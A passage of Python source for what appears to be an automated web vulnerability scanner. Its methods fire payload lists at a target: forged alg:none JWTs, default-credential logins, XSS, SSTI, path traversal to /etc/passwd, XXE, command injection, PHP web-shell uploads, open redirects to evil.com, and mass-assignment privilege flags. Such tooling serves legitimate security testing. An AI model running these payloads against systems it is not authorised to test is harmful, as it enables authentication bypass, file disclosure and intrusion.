            {"username": "admin", "password": "admin123"},
            {"username": "root", "password": "root"},
            {"username": "test", "password": "test"},
        ]
        
        for payload in bypass_payloads:
            resp = self._make_request("POST", endpoint.url, json_data=payload)
            
            # Compare with baseline
            comparison = self._compare_with_baseline(baseline, resp)
            
            is_vuln = False
            confidence = 0.1
            evidence = f"Status: {resp.status_code}"
            is_false_positive = False
            
            # Try to extract and validate token
            token = self._extract_token(resp)
            if token:
                self._log(f"[*] Token found for payload: {json.dumps(payload)[:50]}")
                is_valid, validation_msg = self._validate_token(base_url, token)
                if is_valid:
                    self._log(f"[+] Token VALIDATED!")
                    is_vuln = True
                    confidence = 0.98
                    evidence = f"[VERIFIED] Auth bypass - {validation_msg}"
                else:
                    self._log(f"[-] Token invalid: {validation_msg}")
                    confidence = 0.5
                    evidence = f"Token received but unverified: {validation_msg}"
            elif comparison["is_significant"]:
                if comparison["new_user_data"]:
                    self._log(f"[+] New user data found!")
                    is_vuln = True
                    confidence = 0.85
                    evidence = f"[VERIFIED] Response contains user data not in baseline"
                elif comparison["bypassed_login_page"]:
                    self._log(f"[~] Login page structure changed")
                    confidence = 0.7
                    evidence = f"[LIKELY] Response structure changed from login page"
                elif comparison["significance_score"] >= 30:
                    confidence = 0.5
                    evidence = f"Significant change (score: {comparison['significance_score']}). Needs verification."
            elif not comparison["body_hash_changed"]:
                self._log(f"[-] FALSE POSITIVE: Identical to baseline")
                is_false_positive = True
                confidence = 0.1
                evidence = f"[FALSE POSITIVE] Response identical to baseline"
            elif resp.status_code == 200 and baseline.is_login_page:
                body_lower = resp.body.lower()
                if "<!doctype" in body_lower or "<form" in body_lower:
                    self._log(f"[-] FALSE POSITIVE: Still login page HTML")
                    is_false_positive = True
                    confidence = 0.15
                    evidence = f"[FALSE POSITIVE] Still returns login page HTML"
            
            # Track false positives
            if is_false_positive:
                self._filtered_false_positives.append({
                    "type": "Authentication Bypass",
                    "payload": json.dumps(payload),
                    "reason": evidence.replace("[FALSE POSITIVE] ", "")
                })
                
            if is_vuln or confidence > 0.5:
                results.append(VulnTestResult(
                    vuln_type="Authentication Bypass",
                    payload=json.dumps(payload),
                    target_url=endpoint.url,
                    request_data=json.dumps(payload),
                    response=resp,
                    is_vulnerable=is_vuln,
                    confidence=confidence,
                    evidence=evidence,
                    evidence_hash=self._hash_evidence(f"{resp.status_code}:{resp.body[:500]}")
                ))
                
                if is_vuln:
                    break
                    
        return results
    
    def _test_jwt_vulnerabilities(self, base_url: str) -> list[VulnTestResult]:
        """Test for JWT vulnerabilities."""
        import base64
        results = []
        
        # First, try to get a valid JWT
        login_endpoints = ["/api/v1/login", "/api/login", "/auth/login", "/login"]
        valid_token = None
        
        for ep in login_endpoints:
            resp = self._make_request("POST", f"{base_url}{ep}", json_data={
                "username": "test",
                "password": "test"
            })
            if "token" in resp.body.lower():
                try:
                    data = json.loads(resp.body)
                    valid_token = data.get("token") or data.get("access_token") or data.get("jwt")
                    break
                except:
                    pass
        
        # Test alg:none vulnerability
        def forge_jwt(payload_data: dict) -> str:
            header = {"alg": "none", "typ": "JWT"}
            header_b64 = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip("=")
            payload_b64 = base64.urlsafe_b64encode(json.dumps(payload_data).encode()).decode().rstrip("=")
            return f"{header_b64}.{payload_b64}."
        
        forged_tokens = [
            forge_jwt({"user": "admin", "role": "admin"}),
            forge_jwt({"sub": "admin", "role": "superuser"}),
            forge_jwt({"username": "admin", "admin": True}),
        ]
        
        protected_endpoints = ["/api/v1/profile", "/api/v1/admin", "/api/profile", "/api/admin", "/admin"]
        
        for token in forged_tokens:
            for ep in protected_endpoints:
                url = f"{base_url}{ep}"
                resp = self._make_request("GET", url, headers={
                    "Authorization": f"Bearer {token}"
                })
                
                is_vuln = False
                confidence = 0.1
                evidence = f"Status: {resp.status_code}"
                
                if resp.status_code == 200:
                    body_lower = resp.body.lower()
                    
                    # Check for false positive indicators (login pages, error pages)
                    is_login_page = any(x in body_lower for x in [
                        "<title>log in", "login form", "password", "sign in",
                        "wp-login", "wordpress", "<!doctype html"
                    ]) and "<!doctype" in body_lower
                    
                    is_error_page = any(x in body_lower for x in [
                        "unauthorized", "forbidden", "access denied", "not authenticated"
                    ])
                    
                    # Check for actual data indicators (JSON response with user data)
                    try:
                        json_data = json.loads(resp.body)
                        has_user_data = isinstance(json_data, dict) and any(
                            k in json_data for k in ["user", "username", "email", "id", "role", "profile"]
                        )
                        if has_user_data:
                            is_vuln = True
                            confidence = 0.95
                            evidence = f"JWT alg:none accepted! Got user data: {list(json_data.keys())[:5]}"
                    except (json.JSONDecodeError, ValueError):
                        has_user_data = False
                    
                    # If not JSON but has sensitive data and NOT a login page
                    if not is_vuln and not is_login_page and not is_error_page:
                        if any(x in body_lower for x in ['"user":', '"email":', '"role":']):
                            is_vuln = True
                            confidence = 0.85
                            evidence = f"JWT alg:none accepted! Response contains user data."
                        elif resp.headers.get("Content-Type", "").startswith("application/json"):
                            confidence = 0.6
                            evidence = f"200 JSON response with forged token - needs verification"
                    elif is_login_page:
                        confidence = 0.2
                        evidence = f"Login page returned - NOT vulnerable (false positive filtered)"
                else:
                    confidence = 0.1
                    evidence = f"Non-200 response: {resp.status_code}"
                        
                if is_vuln or confidence > 0.5:
                    results.append(VulnTestResult(
                        vuln_type="JWT Algorithm Confusion (alg:none)",
                        payload=token,
                        target_url=url,
                        request_data=f"Authorization: Bearer {token}",
                        response=resp,
                        is_vulnerable=is_vuln,
                        confidence=confidence,
                        evidence=evidence,
                        evidence_hash=self._hash_evidence(f"{resp.status_code}:{resp.body[:500]}")
                    ))
                    
                    if is_vuln:
                        return results  # Found confirmed vuln
                        
        return results
    
    def _test_xss(self, base_url: str, endpoints: list[EndpointInfo]) -> list[VulnTestResult]:
        """Test for XSS vulnerabilities."""
        results = []
        
        payloads = [
            '<script>alert(1)</script>',
            '"><script>alert(1)</script>',
            "'-alert(1)-'",
            '<img src=x onerror=alert(1)>',
            '{{constructor.constructor("alert(1)")()}}',  # Template injection
        ]
        
        # Test on endpoints that might reflect input
        test_urls = [
            f"{base_url}/search?q=",
            f"{base_url}/api/search?query=",
            f"{base_url}/?name=",
            f"{base_url}/?redirect=",
        ]
        
        for test_url in test_urls:
            for payload in payloads:
                url = f"{test_url}{urllib.parse.quote(payload)}"
                resp = self._make_request("GET", url)
                
                # Check if payload is reflected
                if payload in resp.body or payload.replace('"', '&quot;') in resp.body:
                    results.append(VulnTestResult(
                        vuln_type="Cross-Site Scripting (XSS)",
                        payload=payload,
                        target_url=url,
                        request_data=url,
                        response=resp,
                        is_vulnerable=True,
                        confidence=0.85,
                        evidence=f"Payload reflected in response without encoding",
                        evidence_hash=self._hash_evidence(f"{resp.status_code}:{resp.body[:500]}")
                    ))
                    break
                    
        return results
    
    def _test_ssrf(self, base_url: str, endpoints: list[EndpointInfo]) -> list[VulnTestResult]:
        """Test for SSRF vulnerabilities."""
        results = []
        
        # Common SSRF test URLs
        ssrf_payloads = [
            "http://127.0.0.1",
            "http://localhost",
            "http://169.254.169.254/latest/meta-data/",  # AWS metadata
        ]
        
        # Look for URL parameters
        url_params = ["url", "redirect", "next", "target"]
        
        for param in url_params:
            for payload in ssrf_payloads:
                try:
                    test_url = f"{base_url}/?{param}={urllib.parse.quote(payload)}"
                    resp = self._make_request("GET", test_url)
                    
                    # Check for SSRF indicators
                    if resp.status_code == 200:
                        if any(x in resp.body.lower() for x in ["ami-id", "instance-id", "metadata", "127.0.0.1"]):
                            results.append(VulnTestResult(
                                vuln_type="Server-Side Request Forgery (SSRF)",
                                payload=payload,
                                target_url=test_url,
                                request_data=test_url,
                                response=resp,
                                is_vulnerable=True,
                                confidence=0.9,
                                evidence=f"Internal resource accessed via SSRF",
                                evidence_hash=self._hash_evidence(f"{resp.status_code}:{resp.body[:500]}")
                            ))
                except Exception:
                    # Skip on timeout/connection errors
                    continue
                        
        return results
    
    # ==================== NEW TEST METHODS ====================
    
    def _test_ssti(self, base_url: str, endpoints: list[EndpointInfo], 
                   tech_stack: TechStack) -> list[VulnTestResult]:
        """Test for Server-Side Template Injection."""
        results = []
        
        # Framework-specific payloads
        payloads_by_framework = {
            "jinja2": [
                ("{{7*7}}", "49"),
                ("{{config}}", "SECRET_KEY"),
                ("{{self.__class__.__mro__}}", "__class__"),
            ],
            "twig": [
                ("{{7*7}}", "49"),
                ("{{_self.env.getFilter}}", "getFilter"),
            ],
            "freemarker": [
                ("${7*7}", "49"),
                ("<#assign x=7*7>${x}", "49"),
            ],
            "velocity": [
                ("#set($x=7*7)$x", "49"),
            ],
            "erb": [
                ("<%= 7*7 %>", "49"),
            ],
            "generic": [
                ("{{7*7}}", "49"),
                ("${7*7}", "49"),
                ("<%=7*7%>", "49"),
                ("#{7*7}", "49"),
                ("${{7*7}}", "49"),
            ]
        }
        
        # Select payloads based on detected framework
        fw = (tech_stack.framework or "").lower()
        lang = (tech_stack.language or "").lower()
        
        if "flask" in fw or "jinja" in fw or "python" in lang:
            test_payloads = payloads_by_framework["jinja2"] + payloads_by_framework["generic"]
        elif "php" in lang or "twig" in fw:
            test_payloads = payloads_by_framework["twig"] + payloads_by_framework["generic"]
        elif "java" in lang:
            test_payloads = payloads_by_framework["freemarker"] + payloads_by_framework["velocity"] + payloads_by_framework["generic"]
        elif "ruby" in lang:
            test_payloads = payloads_by_framework["erb"] + payloads_by_framework["generic"]
        else:
            test_payloads = payloads_by_framework["generic"]
        
        # Test parameters that might be rendered in templates
        test_params = ["name", "title", "message", "template", "content", "text", "q", "search"]
        
        for param in test_params:
            for payload, expected in test_payloads:
                test_url = f"{base_url}/?{param}={urllib.parse.quote(payload)}"
                resp = self._make_request("GET", test_url)
                
                if expected in resp.body:
                    self._log(f"[+] SSTI detected with payload: {payload}")
                    results.append(VulnTestResult(
                        vuln_type="Server-Side Template Injection (SSTI)",
                        payload=payload,
                        target_url=test_url,
                        request_data=test_url,
                        response=resp,
                        is_vulnerable=True,
                        confidence=0.95,
                        evidence=f"Template expression evaluated: {payload} -> {expected}",
                        evidence_hash=self._hash_evidence(f"{resp.status_code}:{resp.body[:500]}")
                    ))
                    return results  # Found confirmed
        
        # Test POST endpoints
        for endpoint in endpoints:
            if endpoint.method == "POST":
                for payload, expected in test_payloads[:3]:  # Limit payloads
                    data = {p: payload for p in endpoint.parameters[:2]} if endpoint.parameters else {"input": payload}
                    resp = self._make_request("POST", endpoint.url, json_data=data)
                    
                    if expected in resp.body:
                        results.append(VulnTestResult(
                            vuln_type="Server-Side Template Injection (SSTI)",
                            payload=payload,
                            target_url=endpoint.url,
                            request_data=json.dumps(data),
                            response=resp,
                            is_vulnerable=True,
                            confidence=0.95,
                            evidence=f"Template expression evaluated in POST body",
                            evidence_hash=self._hash_evidence(f"{resp.status_code}:{resp.body[:500]}")
                        ))
                        return results
        
        return results
    
    def _test_lfi(self, base_url: str, endpoints: list[EndpointInfo]) -> list[VulnTestResult]:
        """Test for Local File Inclusion / Path Traversal."""
        results = []
        
        payloads = [
            ("../../../etc/passwd", "root:"),
            ("....//....//....//etc/passwd", "root:"),
            ("..%2f..%2f..%2fetc%2fpasswd", "root:"),
            ("..\\..\\..\\windows\\win.ini", "[fonts]"),
            ("....\\\\....\\\\windows\\\\win.ini", "[fonts]"),
            ("php://filter/convert.base64-encode/resource=index.php", "PD9waHA"),  # Base64 of "<?php"
            ("file:///etc/passwd", "root:"),
        ]
        
        # Common parameters for file inclusion
        file_params = ["file", "page", "path", "include", "doc", "document", "template", "view", "load", "read"]
        
        for param in file_params:
            for payload, expected in payloads:
                test_url = f"{base_url}/?{param}={urllib.parse.quote(payload)}"
                resp = self._make_request("GET", test_url)
                
                if expected in resp.body:
                    self._log(f"[+] LFI detected: {payload}")
                    results.append(VulnTestResult(
                        vuln_type="Local File Inclusion (LFI)",
                        payload=payload,
                        target_url=test_url,
                        request_data=test_url,
                        response=resp,
                        is_vulnerable=True,
                        confidence=0.95,
                        evidence=f"File contents retrieved: {expected[:50]}...",
                        evidence_hash=self._hash_evidence(f"{resp.status_code}:{resp.body[:500]}")
                    ))
                    return results
        
        return results
    
    def _test_xxe(self, base_url: str, endpoints: list[EndpointInfo]) -> list[VulnTestResult]:
        """Test for XML External Entity Injection."""
        results = []
        
        xxe_payloads = [
            # File read
            '''<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><data>&xxe;</data>''',
            # Windows file read
            '''<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><data>&xxe;</data>''',
            # SSRF via XXE
            '''<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1/">]><data>&xxe;</data>''',
        ]
        
        # Look for XML endpoints
        xml_endpoints = [e for e in endpoints if "xml" in e.content_type.lower() or "xml" in e.url.lower()]
        
        # Also try common XML paths
        xml_paths = ["/api/import", "/upload", "/parse", "/xml", "/data"]
        
        for path in xml_paths:
            url = f"{base_url}{path}"
            for payload in xxe_payloads:
                resp = self._make_request("POST", url, 
                    data=payload.encode(),
                    headers={"Content-Type": "application/xml"}
                )
                
                if resp.status_code == 200:
                    if "root:" in resp.body or "[fonts]" in resp.body:
                        results.append(VulnTestResult(
                            vuln_type="XML External Entity (XXE)",
                            payload=payload[:100] + "...",
                            target_url=url,
                            request_data=payload,
                            response=resp,
                            is_vulnerable=True,
                            confidence=0.95,
                            evidence="File contents retrieved via XXE",
                            evidence_hash=self._hash_evidence(f"{resp.status_code}:{resp.body[:500]}")
                        ))
                        return results
        
        return results
    
    def _test_rce(self, base_url: str, endpoints: list[EndpointInfo]) -> list[VulnTestResult]:
        """Test for Remote Code Execution / Command Injection."""
        results = []
        
        # Time-based detection payloads
        payloads = [
            ("; sleep 5", 5000),  # Unix
            ("| sleep 5", 5000),
            ("& ping -c 5 127.0.0.1 &", 5000),
            ("`sleep 5`", 5000),
            ("$(sleep 5)", 5000),
            ("\nping -c 5 127.0.0.1\n", 5000),
            # Windows
            ("& ping -n 5 127.0.0.1 &", 5000),
            ("| timeout 5", 5000),
        ]
        
        # Output-based detection
        output_payloads = [
            ("; id", "uid="),
            ("| id", "uid="),
            ("; whoami", "www-data"),
            ("| cat /etc/passwd", "root:"),
        ]
        
        # Common injection parameters
        cmd_params = ["cmd", "exec", "command", "ping", "query", "host", "ip", "process", "run"]
        
        for param in cmd_params:
            # Time-based tests
            for payload, expected_delay in payloads[:4]:  # Limit to avoid timeout
                test_url = f"{base_url}/?{param}=127.0.0.1{urllib.parse.quote(payload)}"
                resp = self._make_request("GET", test_url)
                
                if resp.elapsed_ms >= expected_delay:
                    self._log(f"[+] Potential RCE via time delay: {payload}")
                    results.append(VulnTestResult(
                        vuln_type="Remote Code Execution (RCE)",
                        payload=payload,
                        target_url=test_url,
                        request_data=test_url,
                        response=resp,
                        is_vulnerable=True,
                        confidence=0.80,
                        evidence=f"Time-based RCE detected: {resp.elapsed_ms}ms delay",
                        evidence_hash=self._hash_evidence(f"{resp.status_code}:{resp.elapsed_ms}")
                    ))
                    return results
            
            # Output-based tests
            for payload, expected in output_payloads:
                test_url = f"{base_url}/?{param}=test{urllib.parse.quote(payload)}"
                resp = self._make_request("GET", test_url)
                
                if expected in resp.body:
                    results.append(VulnTestResult(
                        vuln_type="Remote Code Execution (RCE)",
                        payload=payload,
                        target_url=test_url,
                        request_data=test_url,
                        response=resp,
                        is_vulnerable=True,
                        confidence=0.95,
                        evidence=f"Command output in response: {expected}",
                        evidence_hash=self._hash_evidence(f"{resp.status_code}:{resp.body[:500]}")
                    ))
                    return results
        
        return results
    
    def _test_crlf(self, base_url: str, endpoints: list[EndpointInfo]) -> list[VulnTestResult]:
        """Test for CRLF Injection / HTTP Response Splitting."""
        results = []
        
        payloads = [
            "%0d%0aX-Injected: true",
            "%0d%0aSet-Cookie: injected=true",
            "\r\nX-Injected: true",
            "%E5%98%8A%E5%98%8DX-Injected: true",  # Unicode CRLF
        ]
        
        redirect_params = ["url", "redirect", "next", "return", "dest", "goto"]
        
        for param in redirect_params:
            for payload in payloads:
                test_url = f"{base_url}/?{param}=http://example.com{payload}"
                resp = self._make_request("GET", test_url)
                
                # Check if our header was injected
                if "X-Injected" in str(resp.headers) or "injected=true" in str(resp.headers):
                    results.append(VulnTestResult(
                        vuln_type="CRLF Injection",
                        payload=payload,
                        target_url=test_url,
                        request_data=test_url,
                        response=resp,
                        is_vulnerable=True,
                        confidence=0.90,
                        evidence="Header injection successful",
                        evidence_hash=self._hash_evidence(f"{resp.status_code}:{str(resp.headers)[:500]}")
                    ))
                    return results
        
        return results
    
    def _test_open_redirect(self, base_url: str, endpoints: list[EndpointInfo]) -> list[VulnTestResult]:
        """Test for Open Redirect vulnerabilities."""
        results = []
        
        payloads = [
            "https://evil.com",
            "//evil.com",
            "/\\evil.com",
            "https:evil.com",
            "////evil.com",
            "https://evil.com%2f%2f",
            "https://evil.com?@legitimate.com",
        ]
        
        redirect_params = ["url", "redirect", "next", "return", "dest", "goto", "continue", "target", "rurl", "redirect_uri"]
        
        for param in redirect_params:
            for payload in payloads:
                test_url = f"{base_url}/?{param}={urllib.parse.quote(payload)}"
                resp = self._make_request("GET", test_url)
                
                # Check for redirect to evil domain
                location = resp.headers.get("Location", resp.headers.get("location", ""))
                if "evil.com" in location:
                    results.append(VulnTestResult(
                        vuln_type="Open Redirect",
                        payload=payload,
                        target_url=test_url,
                        request_data=test_url,
                        response=resp,
                        is_vulnerable=True,
                        confidence=0.90,
                        evidence=f"Redirect to external domain: {location}",
                        evidence_hash=self._hash_evidence(f"{resp.status_code}:{location}")
                    ))
                    return results
        
        return results
    
    def _test_cors(self, base_url: str) -> list[VulnTestResult]:
        """Test for CORS misconfigurations."""
        results = []
        
        test_origins = [
            "https://evil.com",
            "null",
            f"{base_url}.evil.com",  # Subdomain
            base_url.replace("https://", "https://evil."),  # Prefix injection
        ]
        
        for origin in test_origins:
            resp = self._make_request("GET", base_url, headers={"Origin": origin})
            
            acao = resp.headers.get("Access-Control-Allow-Origin", "")
            acac = resp.headers.get("Access-Control-Allow-Credentials", "")
            
            if acao == origin or acao == "*":
                is_critical = acac.lower() == "true" and acao != "*"
                confidence = 0.95 if is_critical else 0.70
                severity = "CRITICAL" if is_critical else "MEDIUM"
                
                results.append(VulnTestResult(
                    vuln_type=f"CORS Misconfiguration ({severity})",
                    payload=origin,
                    target_url=base_url,
                    request_data=f"Origin: {origin}",
                    response=resp,
                    is_vulnerable=is_critical,
                    confidence=confidence,
                    evidence=f"ACAO: {acao}, ACAC: {acac}",
                    evidence_hash=self._hash_evidence(f"{acao}:{acac}")
                ))
                
                if is_critical:
                    return results
        
        return results
    
    def _test_graphql(self, base_url: str, endpoints: list[EndpointInfo]) -> list[VulnTestResult]:
        """Test for GraphQL vulnerabilities."""
        results = []
        
        graphql_paths = ["/graphql", "/api/graphql", "/v1/graphql", "/query"]
        
        # Introspection query
        introspection = {
            "query": "{__schema{types{name,fields{name}}}}"
        }
        
        # Batch query (DoS potential)
        batch_query = [
            {"query": "{__typename}"},
            {"query": "{__typename}"},
            {"query": "{__typename}"},
        ]
        
        for path in graphql_paths:
            url = f"{base_url}{path}"
            
            # Test introspection
            resp = self._make_request("POST", url, json_data=introspection)
            
            if "__schema" in resp.body or "types" in resp.body:
                self._log(f"[+] GraphQL introspection enabled at {url}")
                results.append(VulnTestResult(
                    vuln_type="GraphQL Introspection Enabled",
                    payload=introspection["query"],
                    target_url=url,
                    request_data=json.dumps(introspection),
                    response=resp,
                    is_vulnerable=True,
                    confidence=0.90,
                    evidence="Schema information disclosed via introspection",
                    evidence_hash=self._hash_evidence(f"{resp.status_code}:{resp.body[:500]}")
                ))
            
            # Test batch queries
            resp = self._make_request("POST", url, json_data=batch_query)
            
            if resp.status_code == 200 and resp.body.count("__typename") >= 3:
                results.append(VulnTestResult(
                    vuln_type="GraphQL Batching Enabled (DoS risk)",
                    payload=str(batch_query),
                    target_url=url,
                    request_data=json.dumps(batch_query),
                    response=resp,
                    is_vulnerable=False,  # Info only
                    confidence=0.70,
                    evidence="Multiple queries accepted in single request",
                    evidence_hash=self._hash_evidence(f"{resp.status_code}:{resp.body[:500]}")
                ))
        
        return results
    
    def _test_file_upload(self, base_url: str, endpoints: list[EndpointInfo]) -> list[VulnTestResult]:
        """Test for insecure file upload."""
        results = []
        
        # Find upload endpoints
        upload_endpoints = [e for e in endpoints if any(
            x in e.url.lower() for x in ["upload", "file", "image", "avatar", "import"]
        )]
        
        if not upload_endpoints:
            upload_endpoints = [EndpointInfo(url=f"{base_url}/upload", method="POST")]
        
        # Dangerous extensions to test
        payloads = [
            ("test.php", "<?php echo 'RCE'; ?>", "application/x-php"),
            ("test.php.jpg", "<?php echo 'RCE'; ?>", "image/jpeg"),
            ("test.phtml", "<?php echo 'RCE'; ?>", "text/html"),
            ("test.asp", "<% Response.Write(\"RCE\") %>", "application/octet-stream"),
            ("test.jsp", "<%= \"RCE\" %>", "application/octet-stream"),
            ("test.svg", "<svg onload=alert(1)>", "image/svg+xml"),
        ]
        
        for endpoint in upload_endpoints:
            for filename, content, content_type in payloads:
                # Build multipart form data (simplified)
                boundary = "----WebKitFormBoundary7MA4YWxkTrZu0gW"
                body = f"""--{boundary}\r
Content-Disposition: form-data; name="file"; filename="{filename}"\r
Content-Type: {content_type}\r
\r
{content}\r
--{boundary}--"""
                
                resp = self._make_request("POST", endpoint.url,
                    data=body.encode(),
                    headers={"Content-Type": f"multipart/form-data; boundary={boundary}"}
                )
                
                # Check if file was accepted
                if resp.status_code in [200, 201] and "error" not in resp.body.lower():
                    # Try to extract uploaded file path
                    try:
                        data = json.loads(resp.body)
                        file_path = data.get("path") or data.get("url") or data.get("file")
                        evidence = f"File uploaded: {file_path}" if file_path else "File upload accepted"
                    except:
                        evidence = "File upload accepted without extension validation"
                    
                    results.append(VulnTestResult(
                        vuln_type="Insecure File Upload",
                        payload=filename,
                        target_url=endpoint.url,
                        request_data=f"Filename: {filename}, Content-Type: {content_type}",
                        response=resp,
                        is_vulnerable=True,
                        confidence=0.80,
                        evidence=evidence,
                        evidence_hash=self._hash_evidence(f"{resp.status_code}:{resp.body[:500]}")
                    ))
                    return results
        
        return results
    
    def _test_prototype_pollution(self, base_url: str, endpoints: list[EndpointInfo]) -> list[VulnTestResult]:
        """Test for Prototype Pollution (Node.js)."""
        results = []
        
        payloads = [
            {"__proto__": {"polluted": True}},
            {"constructor": {"prototype": {"polluted": True}}},
            {"__proto__.polluted": True},
        ]
        
        for endpoint in endpoints:
            if endpoint.method == "POST":
                for payload in payloads:
                    resp = self._make_request("POST", endpoint.url, json_data=payload)
                    
                    # Check if prototype was polluted (response might include polluted property)
                    if "polluted" in resp.body and "true" in resp.body.lower():
                        results.append(VulnTestResult(
                            vuln_type="Prototype Pollution",
                            payload=json.dumps(payload),
                            target_url=endpoint.url,
                            request_data=json.dumps(payload),
                            response=resp,
                            is_vulnerable=True,
                            confidence=0.85,
                            evidence="Prototype property reflected in response",
                            evidence_hash=self._hash_evidence(f"{resp.status_code}:{resp.body[:500]}")
                        ))
                        return results
        
        return results
    
    def _test_deserialization(self, base_url: str, endpoints: list[EndpointInfo], 
                              tech_stack: TechStack) -> list[VulnTestResult]:
        """Test for insecure deserialization."""
        results = []
        
        lang = (tech_stack.language or "").lower()
        
        # Language-specific payloads
        if "php" in lang:
            # PHP serialize
            payloads = [
                ('O:8:"stdClass":1:{s:4:"test";s:3:"rce";}', "application/x-php-serialized"),
            ]
        elif "python" in lang:
            # Python pickle (base64)
            payloads = [
                ("gASVEgAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIwFcHJpbnSUhZRSlC4=", "application/octet-stream"),
            ]
        elif "java" in lang:
            # Java serialization magic bytes (aced0005)
            payloads = [
                ("rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA==", "application/x-java-serialized-object"),
            ]
        else:
            # Generic test
            payloads = [
                ('{"$type": "System.Windows.Forms.BindingSource"}', "application/json"),  # .NET
            ]
        
        # Look for potential deserialization endpoints
        deser_params = ["data", "object", "state", "session", "token", "payload"]
        
        for param in deser_params:
            for payload, content_type in payloads:
                resp = self._make_request("POST", f"{base_url}/api/{param}",
                    data=payload.encode(),
                    headers={"Content-Type": content_type}
                )
                
                # Check for deserialization errors (indicates parsing)
                if any(x in resp.body.lower() for x in ["unserialize", "unpickle", "objectinputstream", "deserialize"]):
                    results.append(VulnTestResult(
                        vuln_type="Insecure Deserialization",
                        payload=payload[:100],
                        target_url=f"{base_url}/api/{param}",
                        request_data=payload,
                        response=resp,
                        is_vulnerable=False,  # Needs manual verification
                        confidence=0.60,
                        evidence="Deserialization error suggests vulnerable endpoint",
                        evidence_hash=self._hash_evidence(f"{resp.status_code}:{resp.body[:500]}")
                    ))
        
        return results
    
    def _test_type_juggling(self, base_url: str, endpoints: list[EndpointInfo]) -> list[VulnTestResult]:
        """Test for PHP type juggling vulnerabilities."""
        results = []
        
        # Magic hashes that equal "0" when compared loosely
        magic_hashes = [
            "0e462097431906509019562988736854",  # MD5 of "240610708"
            "0e215962017",  # MD5 of "QNKCDZO"
        ]
        
        # Type confusion payloads
        type_payloads = [
            ({"password": True}, "boolean true comparison"),
            ({"password": 0}, "zero comparison"),
            ({"password": []}, "empty array comparison"),
            ({"password": {"password": True}}, "nested object"),
        ]
        
        login_endpoints = [e for e in endpoints if any(
            x in e.url.lower() for x in ["login", "auth", "signin"]
        )]
        
        for endpoint in login_endpoints:
            # Test magic hashes
            for magic in magic_hashes:
                data = {"username": "admin", "password": magic}
                resp = self._make_request("POST", endpoint.url, json_data=data)
                
                if resp.status_code == 200 and any(x in resp.body.lower() for x in ["token", "success", "welcome"]):
                    results.append(VulnTestResult(
                        vuln_type="PHP Type Juggling (Magic Hash)",
                        payload=magic,
                        target_url=endpoint.url,
                        request_data=json.dumps(data),
                        response=resp,
                        is_vulnerable=True,
                        confidence=0.85,
                        evidence="Authentication bypassed with magic hash",
                        evidence_hash=self._hash_evidence(f"{resp.status_code}:{resp.body[:500]}")
                    ))
                    return results
            
            # Test type confusion
            for payload, desc in type_payloads:
                data = {"username": "admin", **payload}
                resp = self._make_request("POST", endpoint.url, json_data=data)
                
                if resp.status_code == 200 and any(x in resp.body.lower() for x in ["token", "success"]):
                    results.append(VulnTestResult(
                        vuln_type=f"PHP Type Juggling ({desc})",
                        payload=json.dumps(payload),
                        target_url=endpoint.url,
                        request_data=json.dumps(data),
                        response=resp,
                        is_vulnerable=True,
                        confidence=0.85,
                        evidence=f"Authentication bypassed via {desc}",
                        evidence_hash=self._hash_evidence(f"{resp.status_code}:{resp.body[:500]}")
                    ))
                    return results
        
        return results
    
    def _test_mass_assignment(self, base_url: str, endpoints: list[EndpointInfo]) -> list[VulnTestResult]:
        """Test for mass assignment vulnerabilities."""
        results = []
        
        # Dangerous parameters to inject
        dangerous_params = [
            ("isAdmin", True),
            ("admin", True),
            ("role", "admin"),
            ("is_admin", True),
            ("user_type", "admin"),
            ("privileges", ["admin"]),
            ("verified", True),
            ("email_verified", True),
            ("is_superuser", True),
        ]
        
        # Test on registration/update endpoints
        mass_endpoints = [e for e in endpoints if any(
            x in e.url.lower() for x in ["register", "signup", "user", "profile", "update", "account"]
        )]
        
        for endpoint in mass_endpoints:
            for param, value in dangerous_params:
                # Add dangerous param to normal registration data
                data = {
                    "username": f"test_{param}",
                    "email": f"test_{param}@test.com",
                    "password": "TestPassword123!",
                    param: value
                }
                
                resp = self._make_request("POST", endpoint.url, json_data=data)
                
                # Check if param was accepted
                if resp.status_code in [200, 201]:
                    try:
                        resp_data = json.loads(resp.body)
                        # Check if our injected param appears in response
                        if param in str(resp_data) and str(value).lower() in str(resp_data).lower():
                            results.append(VulnTestResult(
                                vuln_type="Mass Assignment",
                                payload=f"{param}={value}",
                                target_url=endpoint.url,
                                request_data=json.dumps(data),
                                response=resp,
                                is_vulnerable=True,
                                confidence=0.85,
                                evidence=f"Privileged parameter '{param}' accepted and reflected",
                                evidence_hash=self._hash_evidence(f"{resp.status_code}:{resp.body[:500]}")
                            ))
                            return results
                    except:
                        pass
        
        return results
